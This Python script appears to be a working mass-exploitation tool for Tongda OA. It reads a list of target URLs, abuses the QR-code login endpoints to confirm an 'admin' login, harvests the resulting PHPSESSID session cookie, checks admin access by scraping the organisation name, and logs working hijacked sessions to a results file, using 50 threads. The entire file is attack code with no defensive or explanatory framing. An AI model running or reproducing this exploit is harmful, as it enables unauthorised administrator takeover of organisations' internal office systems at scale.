#!/usr/bin/env python3
#-*- encoding:utf-8 -*-
#V2017
#V2017
#V2017
#V2017
#V2017
#V2017
import requests
import threading
import queue
import urllib3
import re
urllib3.disable_warnings()
q=queue.Queue()


file=open('tongda2.txt')
for x in file.readlines():
        q.put(x.strip())


def scan():
    while not q.empty():
        url=q.get()
        headers={'Content-Type':'text/xml','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.'}
        proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
        try:
            url1 = url + '/ispirit/login_code.php'
            headers1 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
                        "DNT": "1", "X-Forwarded-For": "127.0.0.1", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1"}
            res1 = requests.get(url1, headers=headers1)
            pattern = re.compile(r'"{(.*?)}"')
            codeuid = pattern.findall(res1.text)[0]

            url2 = url + '/general/login_code_scan.php'
            headers2 = {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
            data = 'codeuid={'+codeuid+'}&uid=1&source=pc&type=confirm&username=admin'
            res2 = requests.post(url2, headers=headers2, data=data)
            if r'status":"1' in res2.text:
                url3=url+'/ispirit/login_code_check.php?codeuid={'+codeuid+'}'
                headers3 = {"User-Agent": "python-requests/2.22.0", "Accept-Encoding": "gzip, deflate",
                                 "Accept": "*/*", "Connection": "close"}
                res3 = requests.get(url3, headers=headers3)
                if r'"status":1' in res3.text:
                    pattern = re.compile(r'PHPSESSID=\w+;')
                    Set_cookie = pattern.findall(res3.headers.get('Set-Cookie'))[0].replace(';', '')
                    #print(url+'/general/index.php?isIE=0'+'\t'+Set_cookie)
                    url_admin=url+'/general/system/unit/'
                    headers_admin = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
                        "DNT": "1", "Referer": url+'/general/ipanel/', "Connection": "close",
                        "Upgrade-Insecure-Requests": "1",
                        "Cookie": Set_cookie}
                    res_admin=requests.get(url_admin, headers=headers_admin)
                    pattern2 = re.compile(r'<input type=\"text\" name=\"UNIT_SHOW_NAME\" class=\"BigInput\" size=\"40\" value=\"(.*?)\">')
                    name = pattern2.findall(res_admin.text)[0]
                    print(url + '/general/index.php?isIE=0' + '\t' + Set_cookie+'\t'+name)
                    with open('result.txt','a')as f :
                        f.write(url + '/general/index.php?isIE=0' + '\t' + Set_cookie+'\t'+name+'\n')
            # pattern2 = re.compile(r'PHPSESSID=\w+;')
            # Set_cookie = pattern2.findall(res2.headers.get('Set-Cookie'))[0].replace(';', '')


        except:
                pass
                #lock.release()
th=[]
th_num=50
lock = threading.Lock()
for x in range(th_num):
        t=threading.Thread(target=scan)
        th.append(t)
for x in range(th_num):
        th[x].start()
for x in range(th_num):
        th[x].join()
